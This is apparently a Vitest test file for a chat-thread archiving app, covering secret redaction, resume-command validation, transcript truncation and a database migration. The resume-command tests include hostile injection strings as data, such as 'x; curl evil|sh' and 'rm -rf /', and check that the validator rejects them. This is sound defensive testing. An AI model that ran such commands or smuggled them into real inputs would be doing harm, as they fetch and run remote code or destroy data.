import 'fake-indexeddb/auto';
import { describe, it, expect, beforeEach } from 'vitest';
import Dexie from 'dexie';
import { ThreadkeeperDB, ensureStarterCollectionsAndSettings, updateManualThreadFields, deleteConversationCascade } from '../../src/core/db.js';
import { insightKeyFor, type MessageRecord } from '../../src/core/schema.js';
import {
  buildThreadPayload,
  buildTranscriptOut,
  fingerprintOf,
  redactSecrets,
  safeResumeCommand,
} from '../../src/core/dock/payload.js';
import { threadHash, TRANSCRIPT_MAX_MESSAGE_CHARS } from '../../src/core/dock/protocol.js';
import { freshDb, putInsight, seed, thread } from './dock-helpers.js';
import { parseClaudeCodeSession } from '../../src/core/cli-sessions.js';

describe('secret redaction (tool and system messages)', () => {
  it('redacts common key formats, bearer tokens, PEM blocks and KEY= lines', () => {
    const text = [
      'export OPENAI_API_KEY=sk-proj-abcdefghijklmnopqrstuvwx',
      'aws AKIAABCDEFGHIJKLMNOP done',
      'token ghp_abcdefghijklmnopqrstuvwxyz0123',
      'github_pat_11ABCDEFG0123456789_abcdefghijk',
      'slack xoxb-1234567890-abcdefghij',
      'Authorization: Bearer abc.def.ghijklmnopqrst',
      'DB_PASSWORD: "hunter2 secret"',
      '-----BEGIN RSA PRIVATE KEY-----\nMIIEow\n-----END RSA PRIVATE KEY-----',
      'plain text stays',
    ].join('\n');
    const out = redactSecrets(text);
    for (const secret of ['sk-proj-abc', 'AKIAABCDEF', 'ghp_abc', 'github_pat_11', 'xoxb-123', 'abc.def.ghij', 'hunter2', 'MIIEow']) {
      expect(out).not.toContain(secret);
    }
    expect(out).toContain('Bearer [redacted]');
    expect(out).toContain('plain text stays');
    expect(out).toContain('OPENAI_API_KEY=[redacted]');
  });
});

describe('resume command', () => {
  it('rebuilds only validated, single-quoted claude/codex commands', () => {
    expect(safeResumeCommand({ provider: 'claude_code', resumeCommand: 'cd /home/me/api && claude --resume s-1', workspacePath: '/home/me/api' })).toBe(
      "cd '/home/me/api' && claude --resume 's-1'"
    );
    expect(safeResumeCommand({ provider: 'codex', resumeCommand: "codex resume '0199a-uuid'", workspacePath: null })).toBe("codex resume '0199a-uuid'");
    expect(safeResumeCommand({ provider: 'claude_code', resumeCommand: "cd 'it'\\''s' && claude --resume abc", workspacePath: "/it's" })).toBe(
      `cd '/it'\\''s' && claude --resume 'abc'`
    );
    // Injection attempts and mismatches are dropped.
    expect(safeResumeCommand({ provider: 'claude_code', resumeCommand: 'claude --resume x; curl evil|sh', workspacePath: null })).toBe('');
    expect(safeResumeCommand({ provider: 'claude_code', resumeCommand: "claude --resume 'x; rm -rf ~'", workspacePath: null })).toBe('');
    expect(safeResumeCommand({ provider: 'chatgpt', resumeCommand: 'claude --resume abc', workspacePath: null })).toBe('');
    expect(safeResumeCommand({ provider: 'codex', resumeCommand: 'rm -rf /', workspacePath: null })).toBe('');
    expect(safeResumeCommand({ provider: 'codex', resumeCommand: null, workspacePath: null })).toBe('');
  });

  it('quotes a hostile session id when importing a CLI session', () => {
    const evil = 'x; curl evil|sh';
    const jsonl = [
      { type: 'user', sessionId: evil, cwd: '/repo', uuid: 'u1', timestamp: '2026-10-01T10:00:01Z', message: { role: 'user', content: 'hello there' } },
      { type: 'assistant', sessionId: evil, uuid: 'a1', timestamp: '2026-10-01T10:00:05Z', message: { id: 'm', role: 'assistant', content: [{ type: 'text', text: 'hi' }] } },
    ]
      .map((r) => JSON.stringify(r))
      .join('\n');
    const t = parseClaudeCodeSession(jsonl, { accountId: 'a', workspaceId: 'w', fileName: 's.jsonl' })!;
    expect(t.resumeCommand).toBe(`cd /repo && claude --resume 'x; curl evil|sh'`);
    // And Still never gets it: the id fails validation.
    expect(safeResumeCommand({ provider: 'claude_code', resumeCommand: t.resumeCommand, workspacePath: '/repo' })).toBe('');
  });
});

describe('transcript budget', () => {
  const msgs = (n: number, size = 10): MessageRecord[] =>
    Array.from({ length: n }, (_, i) => ({
      messageKey: `k:m:${i}`,
      threadKey: 'k',
      ordinal: i,
      sourceMessageId: `m${i}`,
      role: i % 2 ? 'assistant' : 'user',
      content: 'x'.repeat(size),
      createdAt: null,
      contentHash: '',
      hasCode: false,
      hasArtifact: false,
      branchPath: '',
    }));

  it('includes everything when it fits', () => {
    const t = buildTranscriptOut(msgs(5), 3, { mode: 'full' });
    expect(t).toMatchObject({ included: true, revision: 3, truncated: false, totalMessages: 5, from: 0 });
    expect(t.messages.map((m) => m.index)).toEqual([0, 1, 2, 3, 4]);
  });

  it('keeps the first 20 and the newest that fit when over budget', () => {
    const t = buildTranscriptOut(msgs(200, 1000), 1, { mode: 'full', budgetChars: 60_000 });
    expect(t.truncated).toBe(true);
    expect(t.messages.slice(0, 20).map((m) => m.index)).toEqual(Array.from({ length: 20 }, (_, i) => i));
    expect(t.messages[t.messages.length - 1].index).toBe(199);
    const total = t.messages.reduce((n, m) => n + m.content.length, 0);
    expect(total).toBeLessThanOrEqual(60_000);
  });

  it('caps the count at 4000 messages and cuts very long messages', () => {
    expect(buildTranscriptOut(msgs(4100, 1), 1, { mode: 'full' }).messages.length).toBe(4000);
    const long = buildTranscriptOut(msgs(1, TRANSCRIPT_MAX_MESSAGE_CHARS + 50), 1, { mode: 'full' });
    expect(long.messages[0].content.endsWith('[… cut: 50 more characters]')).toBe(true);
  });

  it('returns windows by ordinal', () => {
    const t = buildTranscriptOut(msgs(50), 1, { mode: 'window', window: { from: 10, count: 5 } });
    expect(t).toMatchObject({ from: 10, totalMessages: 50 });
    expect(t.messages.map((m) => m.index)).toEqual([10, 11, 12, 13, 14]);
  });
});

describe('buildThreadPayload', () => {
  let db: ThreadkeeperDB;
  beforeEach(async () => {
    db = freshDb();
    await ensureStarterCollectionsAndSettings(db);
  });

  it('maps a thread with an AI v2 analysis and its summary, refs 0-based', async () => {
    const key = await seed(
      db,
      thread('a1', 'Stripe webhook retries', [
        ['user', 'How do I make the webhook idempotent?'],
        ['assistant', 'Store processed event ids and skip duplicates.'],
        ['tool', 'export STRIPE_SECRET_KEY=sk_live_abcdefghijklmnopqrstuv'],
      ])
    );
    await putInsight(db, key, { overview: ['First paragraph.', 'Second paragraph.'], analysisVersion: 2, produced: [{ label: 'handler.ts', kind: 'code', description: 'Webhook handler', messageIndex: 1 }] });
    const conv = (await db.conversations.get(key))!;
    await db.summaries.put({
      threadKey: key,
      sourceRevision: conv.sourceRevision,
      contentHash: conv.contentHash,
      model: 'claude-opus-5-5',
      generatedAt: '2026-10-31T09:00:00.000Z',
      groundingVerified: true,
      whereYouLeftOff: 'Handler written.',
      whereYouLeftOffMessageIndexes: [1],
      currentStatus: '',
      currentStatusMessageIndexes: [],
      decisions: [{ text: 'Use event ids', messageIndexes: [1], evidenceQuote: 'Store processed event ids', speaker: 'assistant_suggested', rationale: 'so retries cannot double-charge' } as never],
      openQuestions: [],
      actionItems: [],
      constraints: [],
      entities: [],
      artifactReferences: [],
      suggestedProject: null,
      suggestedTags: [],
      confidence: 0.9,
      keyPoints: [{ text: 'Stripe retries for 3 days', messageIndexes: [1], evidenceQuote: 'skip duplicates', speaker: 'assistant_suggested' }],
      nextStep: 'Write the replay test.',
    } as never);
    const settings = await ensureStarterCollectionsAndSettings(db);
    const p = (await buildThreadPayload(db, settings, key, { transcript: 'full', seq: 7 }))!;
    expect(p.hash).toBe(threadHash(key));
    expect(p).toMatchObject({ provider: 'chatgpt', providerLabel: 'ChatGPT', category: 'chat', seq: 7, kind: 'coding', kindLabel: 'Building', analysisVersion: 2 });
    expect(p.url).toBe('https://chatgpt.com/c/a1');
    expect(p.analysis).toMatchObject({
      source: 'ai',
      modelLabel: 'Claude Opus 5.5',
      stale: false,
      overview: ['First paragraph.', 'Second paragraph.'],
      nextStep: 'Write the replay test.',
      whereYouLeftOff: { text: 'Handler written.', refs: [1] },
      keyPoints: [{ text: 'Stripe retries for 3 days', refs: [1] }],
      artifacts: [{ label: 'handler.ts', kind: 'code', description: 'Webhook handler', ref: 1 }],
    });
    expect(p.analysis!.decisions[0]).toMatchObject({ rationale: 'so retries cannot double-charge', speaker: 'assistant_suggested', refs: [1] });
    expect(p.transcript.included).toBe(true);
    expect(p.transcript.messages[2].content).toContain('[redacted]');
    expect(p.transcript.messages[2].content).not.toContain('sk_live_abcdefghijklmnop');
    expect(p.fingerprint).toMatch(/^f1-[0-9a-f]{32}$/);
  });

  it('never builds a payload for local-only, local-only-project, excluded-provider, synthetic or deleted threads', async () => {
    const a = await seed(db, thread('p1', 'Private', [['user', 'secret']], { cloudExcluded: true }));
    const b = await seed(db, thread('p2', 'Personal', [['user', 'diary']], { project: 'Personal', categoryLocked: true }));
    const c = await seed(db, thread('p3', 'Synthetic', [['user', 'x']], { isSyntheticBenchmark: true }));
    const d = await seed(db, thread('p4', 'Gemini chat', [['user', 'x']], { provider: 'gemini' }));
    const e = await seed(db, thread('p5', 'Deleted', [['user', 'x']]));
    await deleteConversationCascade(db, e);
    const settings = { ...(await ensureStarterCollectionsAndSettings(db)), cloudExcludedProviders: ['gemini' as const] };
    for (const key of [a, b, c, d, e]) {
      expect(await buildThreadPayload(db, settings, key, { transcript: 'full', seq: 1 })).toBeNull();
    }
  });

  it('omits transcripts when sharing is off in Threadkeeper', async () => {
    const key = await seed(db, thread('t1', 'T', [['user', 'hello there']]));
    const base = await ensureStarterCollectionsAndSettings(db);
    const settings = { ...base, sidebarDock: { ...base.sidebarDock, shareTranscripts: false } };
    const p = (await buildThreadPayload(db, settings, key, { transcript: 'full', seq: 1 }))!;
    expect(p.transcript).toMatchObject({ included: false, messages: [] });
  });

  it('fingerprint ignores capture clocks but follows title, tags and analysis', async () => {
    const key = await seed(db, thread('f1', 'Title', [['user', 'hi there']]));
    const settings = await ensureStarterCollectionsAndSettings(db);
    const p1 = (await buildThreadPayload(db, settings, key, { transcript: 'none', seq: 1 }))!;
    await db.conversations.update(key, { lastCapturedAt: '2030-01-01T00:00:00.000Z' });
    const p2 = (await buildThreadPayload(db, settings, key, { transcript: 'none', seq: 2 }))!;
    expect(p2.fingerprint).toBe(p1.fingerprint);
    await updateManualThreadFields(db, key, { manualTitleOverride: 'Renamed' });
    const p3 = (await buildThreadPayload(db, settings, key, { transcript: 'none', seq: 3 }))!;
    expect(p3.title).toBe('Renamed');
    expect(p3.fingerprint).not.toBe(p1.fingerprint);
    await putInsight(db, key, { source: 'ai' });
    const p4 = (await buildThreadPayload(db, settings, key, { transcript: 'none', seq: 4 }))!;
    expect(p4.fingerprint).not.toBe(p3.fingerprint);
    expect(fingerprintOf({ ...p4, tags: [...p4.tags].reverse() })).toBe(p4.fingerprint);
  });

  it('derives sibling branch thread keys and coding-agent fields', async () => {
    const key = await seed(
      db,
      thread('cc1', 'Refactor', [['user', 'refactor the parser']], {
        provider: 'claude_code',
        siblingBranchIds: ['branch_2'],
        workspacePath: '/repo',
        gitBranch: 'main',
        resumeCommand: 'cd /repo && claude --resume cc1',
      })
    );
    const settings = await ensureStarterCollectionsAndSettings(db);
    const p = (await buildThreadPayload(db, settings, key, { transcript: 'none', seq: 1 }))!;
    expect(p.category).toBe('coding_agent');
    expect(p.siblingThreadKeys).toEqual([key.replace(/:main$/, ':branch_2')]);
    expect(p.resumeCommand).toBe("cd '/repo' && claude --resume 'cc1'");
    expect(p.url).toBe('');
    expect(p.analysis).toBeNull();
  });
});

describe('Dexie v3 migration', () => {
  it('adds the dock tables to a v2 database without touching data', async () => {
    const name = `DockMigration_${Date.now()}`;
    const v2 = new Dexie(name);
    v2.version(2).stores({
      conversations: 'threadKey, provider, accountId, workspaceId, sourceConversationId, project, workflowState, coverage, updatedAt, isSyntheticBenchmark',
      messages: 'messageKey, threadKey, ordinal, sourceMessageId',
      chunks: 'chunkKey, threadKey, chunkIndex',
      vectors: 'vectorKey, [indexType+model+dimensions], threadKey, chunkKey, accountId, workspaceId, provider',
      summaries: 'threadKey, sourceRevision',
      relationships: 'relationshipKey, fromThreadKey, toThreadKey, relationType',
      collections: 'name, isStarterArea',
      tags: 'canonicalName',
      jobs: 'jobId, status, threadKey, jobType',
      changeLogs: 'changeId, createdAt, undone',
      tombstones: 'threadKey, [provider+sourceConversationId+branchId], deletedAt',
      settings: 'id',
      insights: 'insightKey, threadKey, source, kind',
      threadVectors: 'vectorKey, threadKey, space',
      handles: 'id',
    });
    await v2.open();
    await v2.table('settings').put({ id: 'default', theme: 'dark', settingsVersion: 2 });
    await v2.table('conversations').put({ threadKey: 'k1', project: 'HypeStake' });
    await v2.table('insights').put({ insightKey: insightKeyFor('ai', 'k1'), threadKey: 'k1', source: 'ai', kind: 'coding' });
    v2.close();

    const db = new ThreadkeeperDB(name);
    const settings = await ensureStarterCollectionsAndSettings(db);
    expect(db.verno).toBe(3);
    expect(settings.theme).toBe('dark');
    expect(settings.sidebarDock.pairedId).toBe('');
    expect(await db.conversations.count()).toBe(1);
    expect(await db.insights.count()).toBe(1);
    await db.dockOutbox.put({ threadKey: 'k1', op: 'upsert', notBefore: '2026-01-01T00:00:00.000Z', attempts: 0, lastError: '', leaseUntil: '', dirtySeq: 1, updatedAt: '' });
    expect(await db.dockOutbox.where('notBefore').below('2027').count()).toBe(1);
    expect(await db.dockSent.count()).toBe(0);
    expect(await db.dockTracked.count()).toBe(0);
    expect(await db.dockMeta.count()).toBe(0);
  });
});
